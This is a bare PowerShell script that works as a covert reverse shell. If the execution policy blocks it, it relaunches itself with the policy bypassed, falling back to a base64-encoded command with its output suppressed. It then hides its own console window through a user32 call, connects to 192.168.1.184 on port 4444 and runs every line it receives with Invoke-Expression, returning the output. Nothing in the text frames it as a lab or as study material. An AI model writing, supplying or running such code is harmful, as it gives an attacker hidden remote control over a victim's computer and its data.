function Test-IsBypassProcess {
    try { (Get-ExecutionPolicy -Scope Process -ErrorAction Stop) -in 'Bypass','Unrestricted' }
    catch { $false }
}

if (-not (Test-IsBypassProcess)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    if ($scriptPath) {
        $escapedArgs = $args | ForEach-Object {
            if ($_ -match '\s') { '"' + $_.Replace('"','\"') + '"' } else { $_ }
        } -join ' '
        $psArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $escapedArgs"
        $proc = Start-Process -FilePath (Get-Command pwsh -ErrorAction SilentlyContinue)?.Source ?? (Get-Command powershell.exe).Source -ArgumentList $psArgs -NoNewWindow -Wait -PassThru
        exit $proc.ExitCode
    }

    $scriptText = $MyInvocation.MyCommand.Definition
    if (-not $scriptText) {
        exit 1
    }

    $argsTemp = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString() + '.json')
    $args | ConvertTo-Json -Compress | Out-File -FilePath $argsTemp -Encoding UTF8

    $wrapper = @"
`$argsFromFile = (Get-Content -Raw -Encoding UTF8 '$argsTemp' | ConvertFrom-Json)
# restore $args in the child process
`$script:args = @()
if (`$argsFromFile) { `$script:args += `$argsFromFile }
# original script start
$scriptText
# original script end
Remove-Item -LiteralPath '$argsTemp' -ErrorAction SilentlyContinue
"@

    $bytes = [System.Text.Encoding]::Unicode.GetBytes($wrapper)
    $b64   = [Convert]::ToBase64String($bytes)

    $pwExe = (Get-Command pwsh -ErrorAction SilentlyContinue)?.Source
    if (-not $pwExe) { $pwExe = (Get-Command powershell.exe -ErrorAction SilentlyContinue).Source }

    $argsList = "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", $b64
    $proc = Start-Process -FilePath $pwExe -ArgumentList $argsList -NoNewWindow -RedirectStandardOutput ([System.IO.StreamWriter]::Null) -PassThru -Wait
    exit $proc.ExitCode
}

$hwnd = (Get-Process -Id $PID).MainWindowHandle
if ($hwnd -ne 0) {
    $signature = @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
    Add-Type $signature
    [WinAPI]::ShowWindow($hwnd, 0)  # 0 = SW_HIDE
}

$client = New-Object System.Net.Sockets.TcpClient("192.168.1.184", 4444)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

while ($true) {
    try {
        $command = $reader.ReadLine()
        if ($command -eq "exit" -or $command -eq $null) { break }

        $output = Invoke-Expression $command 2>&1 | Out-String

        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("Error: " + $_.Exception.Message)
    }
}

$client.Close()
